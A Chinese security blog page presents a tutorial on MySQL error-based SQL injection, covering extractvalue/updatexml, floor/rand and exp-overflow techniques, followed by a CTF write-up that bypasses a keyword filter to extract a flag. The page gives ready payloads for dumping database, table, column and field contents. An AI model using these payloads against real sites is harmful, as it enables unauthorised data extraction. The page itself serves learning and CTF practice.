@@ -1,0 +1,460 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || 报错注入</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>报错注入 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/1/28
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/SQL注入" style=color:#1bccbc>
+                    SQL注入
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中</li>
+<li>常用在不能使用<code>union</code>联合查询时</li>
+</ul>
+<h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><blockquote>
+<p>主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数，使用条件：mysql版本&gt;5.1.5</p>
+</blockquote>
+<h4 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h4><ul>
+<li><p>函数原型：<code>extractvalue(xml_document,Xpath_string)</code>，第一个参数：<code>xml_document</code>是string格式，为xml文档对象的名称，第二个参数：<code>Xpath_string</code>是<code>xpath</code>格式的字符串</p>
+</li>
+<li><p>作用：从目标xml中返回包含所查询值的字符串</p>
+</li>
+<li><p>第二个参数是要求符合xpath语法的字符串，如果不满足要求则会报错，并且将查询结果放在报错信息里</p>
+</li>
+<li><p>如：<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p>
+<pre><code class="mysql"># 查数据库名：
+id=&#39;and(select extractvalue(1,concat(0x7e,(select database()))))
+</code></pre>
+<pre><code class="mysql"># 爆表名：
+id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))
+</code></pre>
+<pre><code class="mysql"># 爆列名：
+id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))
+</code></pre>
+<pre><code class="mysql"># 爆字段：
+id=&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))
+</code></pre>
+</li>
+<li><p><code>0x7e</code>=<code>~</code>，<code>~</code>可以换成<code>#</code>、<code>$</code>等不满足xpath格式的字符</p>
+</li>
+<li><p><code>extractvalue()</code>能查询字符串的最大长度为32，如果结果超过32，要用<code>substring()</code>截取或<code>limit()</code>分页</p>
+</li>
+</ul>
+<h4 id="updatexml函数"><a href="#updatexml函数" class="headerlink" title="updatexml函数"></a>updatexml函数</h4><ul>
+<li><p>函数原型：<code>updatexml(xml_document,xpath_string,new_value)</code>，前两个参数和<code>extractvalue</code>函数一样，第三个参数：<code>new_value</code>是string格式，替换查找到的符合条件的数据，用于改变文档中符合条件的节点的值</p>
+</li>
+<li><p>因为第二个参数跟<code>extractvalue</code>函数的第二个参数一样，所以也可以利用，且利用方式相同</p>
+</li>
+<li><p>如：<code>id=&#39;and(select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;))</code></p>
+<pre><code class="mysql"># 爆数据库名：
+id=&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))
+</code></pre>
+<pre><code class="mysql"># 爆表名：
+id=&#39;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))
+</code></pre>
+<pre><code class="mysql">#爆列名：
+id=&#39;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;),0x7e)))
+</code></pre>
+<pre><code class="mysql">#爆数据：
+id=&#39;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))
+</code></pre>
+</li>
+</ul>
+<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><ul>
+<li><p><code>floor()</code>报错注入是利用<code>count()、rand()、floor()、group by</code>这几个特定的函数结合在一起产生的注入漏洞，准确的说是<code>floor、count、group by</code>冲突报错</p>
+</li>
+<li><p><strong>报错原理：</strong>利用数据库表主键不能重复的原理，<code>floor(rand(0)*2)</code>语句的多次执行，造成虚拟表中主键的重复，导致报错</p>
+</li>
+<li><p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致<code>group by</code>语句出错，<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中，读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据</p>
+</li>
+<li><p>Rand()函数：返回<code>[0,1)</code>之间的随机数，用法是<code>SELECT rand()</code></p>
+</li>
+<li><p>Floor()函数：向下取整，用法即<code>SELECT floor(11.332423)</code>，结果为11</p>
+</li>
+<li><p>常利用这两个函数的方法是<code>floor(rand(0)*2)</code> ，会生成0和1两个数，得到一个固定序列：<code>011011011...</code>(伪随机序列)</p>
+</li>
+<li><p>group by：<code>group by</code>是根据一个或多个列对结果集进行分组的sql语句</p>
+</li>
+<li><p>具体的sql语句分析——<code>select count(*),(floor(rand(0)*2)) x from users group by x</code>    </p>
+<ul>
+<li>在执行以上语句时，mysql会先建立一个虚拟表，然后开始查询数据，取数据库中的数据，如果虚拟表中没有相等的键值，就会添加对应的记录，如果找到相应的键值，就会<code>count(*)++</code></li>
+<li>建立虚拟表(空表)，开始查询，执行<code>floor(rand(0)*2)</code>结果为0，与第一条记录比较，发现不存在与之相等的键值</li>
+<li>然后再次执行<code>floor(rand(0)*2)</code>结果为1，将1添加至虚拟表中，生成第一条记录</li>
+<li>继续查询，再次计算<code>floor(rand(0)*2)</code>结果为1，查询虚拟表，发现与之相等的键值，于是执行<code>count(*)++</code></li>
+<li>继续！执行<code>floor(rand(0)*2)</code>结果为0，查询虚拟表，未发现键值为零，再次执行<code>floor(rand(0)*2)</code>结果为1，插入虚拟表中，但是此时虚拟表中已经存在键值为一的主键，所以造成了主键的重复导致了报错</li>
+</ul>
+</li>
+<li><p>常用的payload：</p>
+<pre><code class="mysql"># 爆数据库名：
+&#39;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
+</code></pre>
+<pre><code class="mysql"># 爆表名：
+&#39;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
+</code></pre>
+<pre><code class="mysql">#爆列名：
+&#39;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
+</code></pre>
+<pre><code class="mysql"># 爆数据：
+&#39;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a
+</code></pre>
+</li>
+</ul>
+<h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><ul>
+<li><p>适用mysql数据库版本是：5.5.5—5.5.49，mysql5.5.47可以在报错中返回查询结果，有的版本报错但是不返回查询结果</p>
+</li>
+<li><p>试着对最大数做加法运算，可以看到报错的具体情况：</p>
+<pre><code class="mysql">select 18446744073709551615+1;
+# 报错信息：ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(18446744073709551615 + 1)&#39;
+</code></pre>
+</li>
+<li><p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：<code>select ~0+1;</code></p>
+</li>
+<li><p>利用exp函数也会产生类似的溢出错误：</p>
+<pre><code class="mysql">select exp(710);
+# 报错信息：ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;
+</code></pre>
+</li>
+<li><p>payload形如：<code>select exp(~(select*from(select user())x))</code></p>
+</li>
+</ul>
+<h3 id="考核赛的sql题"><a href="#考核赛的sql题" class="headerlink" title="考核赛的sql题"></a>考核赛的sql题</h3><ul>
+<li><p>robots.txt可以找到后台目录，直接访问是一个登录页面，存在sql注入，但是过滤了挺多东西</p>
+</li>
+<li><p>反正考核结束了偷偷看一眼源码：</p>
+<pre><code class="php">&lt;?php
+function fl_value($str)&#123;
+    if(empty($str))&#123;return;&#125;
+    return preg_replace(&#39;/ select | insert | update | and | or | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file| drop |as
+|outfile/i&#39;,&#39;&#39;,$str);
+&#125;
+
+function fl_html($str)&#123;
+    return htmlspecialchars($str);
+&#125;
+</code></pre>
+</li>
+<li><p>过滤了一堆，替换为空</p>
+</li>
+<li><p>这里不可以双写绕过，发现这个正则匹配竟然是每个词两边都加了空格的，那岂不是把空格换成别的就可以绕过</p>
+</li>
+<li><p>试了一下：<code>user=adin&#39;%0aor%201#&amp;password=admin&amp;submit=</code>，回显密码错误，成功了！！！！</p>
+</li>
+<li><p>好像真的是这样？？</p>
+</li>
+<li><p>数据库：</p>
+<pre><code class="mysql">payload：
+user=adimn&#39;%0aand(select%20updatexml(1,concat(0x7e,(select%20database())),0x7e))#
+回显：
+XPATH syntax error: &#39;~cms&#39;
+</code></pre>
+</li>
+<li><p>各种payload打了半天都不通，才发现等号给过滤了，换成like，表：</p>
+<pre><code class="mysql">payload：
+user=admin&#39;%0aand(select%20updatexml(1,concat(0x7e,(select(group_concat(table_name))from%0ainformation_schema.tables%0awhere%0atable_schema%20like%20database())),0x7e))#
+回显：
+XPATH syntax error: &#39;~admin,admin_group,alone,article&#39;
+</code></pre>
+</li>
+<li><p>但是这里就给看了4个表，因为updatexml回显长度是有限制的</p>
+</li>
+<li><p>用<code>limit</code>看，第15行找到flag表：</p>
+<pre><code class="mysql">payload：
+user=admin&#39;%0aand(select%20updatexml(1,concat(0x7e,(select(table_name)from%0ainformation_schema.tables%0awhere%0atable_schema%20like%20database()%20limit%2015,1)),0x7e))#
+回显：
+XPATH syntax error: &#39;~flag&#39;
+</code></pre>
+</li>
+<li><p>然后看flag表的列，第2列找到<code>flllaaaggg</code></p>
+<pre><code class="mysql">payload：
+user=admin&#39;%0aand(select%20updatexml(1,concat(0x7e,(select%20(column_name)from%20information_schema.columns%0awhere%0atable_name%20like%20&#39;flag&#39;limit%201,1)),0x7e))#
+回显：
+XPATH syntax error: &#39;~flllaaaggg&#39;
+</code></pre>
+</li>
+<li><p>看字段，拿到前半段flag：</p>
+<pre><code class="mysql">payload：
+user=admin&#39;%0aand(select%20updatexml(1,concat(0x7e,(select%20group_concat(flllaaaggg)from%20flag)),0x7e))#
+回显：
+XPATH syntax error: &#39;~DLNUCTF&#123;e5ada6e4b9a0e68891e4bda&#39;
+</code></pre>
+</li>
+<li><p>后半段，right截取：</p>
+<pre><code class="mysql">payload：
+user=admin&#39;%0aand(select%20updatexml(1,right(concat(0x7e,(select%20group_concat(flllaaaggg)from%20flag)),20),0x7e))#
+回显：
+XPATH syntax error: &#39;e68095e4ba86e59097&#125;
+</code></pre>
+</li>
+<li><p>flag：<code>DLNUCTF&#123;e5ada6e4b9a0e68891e4bda86e59097&#125;</code>，好耶，大功告成</p>
+</li>
+</ul>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2023 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
